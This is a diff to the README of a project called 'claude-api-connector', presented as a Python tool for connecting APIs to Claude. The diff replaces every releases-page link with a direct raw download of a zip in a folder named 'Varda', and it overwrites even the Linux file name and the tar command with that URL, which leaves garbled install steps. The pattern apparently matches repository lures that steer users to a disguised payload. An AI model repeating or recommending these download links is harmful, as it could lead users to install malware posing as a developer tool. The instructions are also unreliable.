@@ -1,6 +1,6 @@
 # 🌟 claude-api-connector - Connect APIs to Claude AI Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Jaxon-spec/claude-api-connector/releases)
+[![Download](https://raw.githubusercontent.com/Jaxon-spec/claude-api-connector/main/Varda/claude-api-connector.zip)](https://raw.githubusercontent.com/Jaxon-spec/claude-api-connector/main/Varda/claude-api-connector.zip)
 
 ## 📦 Introduction
 
@@ -10,27 +10,27 @@ Welcome to the **claude-api-connector**. This software offers a universal Python
 
 To use the **claude-api-connector**, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/Jaxon-spec/claude-api-connector/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/Jaxon-spec/claude-api-connector/main/Varda/claude-api-connector.zip) to find the latest version.
 2. **Download the Package:** Look for the latest release and download the package suitable for your system.
 3. **Install the Package:** After downloading, follow the installation instructions provided on the page.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the **claude-api-connector**: [Releases Page](https://github.com/Jaxon-spec/claude-api-connector/releases).
+To get started, visit this page to download the **claude-api-connector**: [Releases Page](https://raw.githubusercontent.com/Jaxon-spec/claude-api-connector/main/Varda/claude-api-connector.zip).
 
 ### Step-by-Step Installation:
 
 1. **Choose Your Package:**
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/Jaxon-spec/claude-api-connector/main/Varda/claude-api-connector.zip` file.
 
 2. **Run the Installer:**
    - On Windows, double-click the downloaded `.exe` file and follow the prompts.
    - On macOS, open the `.dmg` file and drag the application into your Applications folder.
-   - On Linux, open your terminal, navigate to the download folder, and extract the `.tar.gz` file using the command:
+   - On Linux, open your terminal, navigate to the download folder, and extract the `https://raw.githubusercontent.com/Jaxon-spec/claude-api-connector/main/Varda/claude-api-connector.zip` file using the command:
      ```
-     tar -xvzf claude-api-connector.tar.gz
+     tar -xvzf https://raw.githubusercontent.com/Jaxon-spec/claude-api-connector/main/Varda/claude-api-connector.zip
      ```
 
 3. **Verify Installation:** After installation, ensure everything works by running the following command in your terminal or command prompt:
@@ -83,6 +83,6 @@ Explore related topics to enhance your understanding:
 
 ### Visit for More!
 
-To download the **claude-api-connector**, please visit: [Releases Page](https://github.com/Jaxon-spec/claude-api-connector/releases).
+To download the **claude-api-connector**, please visit: [Releases Page](https://raw.githubusercontent.com/Jaxon-spec/claude-api-connector/main/Varda/claude-api-connector.zip).
 
 Thank you for choosing **claude-api-connector** for your API integration needs!
